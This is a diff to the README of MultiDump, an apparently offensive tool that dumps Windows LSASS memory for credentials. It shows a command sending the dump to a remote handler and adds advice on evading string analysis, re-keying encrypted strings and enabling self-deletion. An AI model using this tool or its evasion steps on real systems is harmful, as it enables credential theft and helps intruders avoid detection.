@@ -32,6 +32,8 @@ Examples:
         MultiDump.exe --procdump -p C:\Tools\procdump.exe -r 10.0.0.1:9001
 ```
 
+As with all LSASS related tools, Administrator/SeDebugPrivilege priviledges are required.
+
 By default, MultiDump uses the `Comsvc.dll` method and saves the encrypted dump in the current directory.
 
 ```powershell
@@ -65,9 +67,25 @@ The key is encrypted with the handler's IP and port. When MultiDump connects thr
 
 Open in Visual Studio, build in **Release** mode.
 
+### Customising MultiDump
+
+It is recommneded to customise the binary before compiling, such as changing the static strings or the RC4 key used to encrypt them, to do so, another Visual Studio project `EncryptionHelper`, is included. Simply change the key or strings and the output of the compiled `.exe` can be pasted into `MultiDump.c` and `Common.h`.
+
+Self deletion can be toggled by uncommenting the following line in `Common.h`:
+
+```c
+#define SELF_DELETION
+```
+
+To evade string analysis, most of the output messages can be excluded from compiling by commenting the following line in `Debug.h`:
+
+```c
+//#define DEBUG
+```
+
 ### Credits
 
-- Some techniques used learnt from [MalDev Academy](https://maldevacademy.com)
+- Some techniques used learnt from [MalDev Academy](https://maldevacademy.com), it is an awesome course, highly recommended
 - Inspired by [proc_noprocdump](https://github.com/djackreuter/proc_noprocdump)
 - Code to further process LSASS dump from [lsassy](https://github.com/Hackndo/lsassy)
 - Testing and suggestions from [ballro](https://github.com/ballro)
